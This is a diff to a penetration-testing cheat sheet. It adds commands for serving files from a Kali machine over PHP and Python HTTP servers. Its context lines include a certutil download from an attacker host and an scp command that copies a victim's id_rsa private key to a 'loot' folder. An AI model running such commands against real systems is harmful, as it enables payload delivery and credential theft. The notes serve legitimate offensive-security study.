@@ -93,3 +93,32 @@ certutil -urlcache -f http://$KALI:82/$FILE $FILE
 scp id_rsa root@$KALI:/root/loot
 ```
 
+
+
+
+
+## Share Files
+
+### PHP
+
+**Kali**
+
+```
+php -S 0.0.0.0:82
+```
+
+### **Python2**
+
+**Kali**
+
+```
+python2 -m SimpleHTTPServer 82
+```
+
+### **Python3**
+
+**Kali**
+
+```
+python3 -m http.server 82
+```
